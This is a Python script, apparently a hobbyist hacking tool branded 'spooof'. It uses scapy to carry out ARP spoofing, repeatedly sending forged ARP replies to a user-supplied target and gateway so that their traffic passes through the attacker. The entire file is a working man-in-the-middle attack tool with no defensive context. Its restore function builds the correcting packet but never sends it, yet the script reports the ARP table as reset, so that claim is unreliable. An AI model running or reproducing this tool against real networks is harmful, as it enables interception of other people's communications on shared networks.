import scapy.all as scapy
import time

def display_banner():
    banner = """

  ██████  ██▓███   ▒█████   ▒█████   ▒█████    █████▒
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ 
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒██░  ██▒▒████ ░ 
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▒██   ██░░▓█▒  ░ 
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░ ████▓▒░░▒█░    
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░   ░ ▒ ▒░  ░      
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░    
      ░               ░ ░      ░ ░      ░ ░          
                                                     
       -by namikaze88
"""

    print(banner)

display_banner()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)


target_ip = input("Enter the target IP address: ")
gateway_ip = input("Enter the gateway IP address: ")

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[X] Detected Ctrl + C... Resetting ARP Table.. Wait!")
    restore(target_ip, gateway_ip)
    print("[X] Done!")

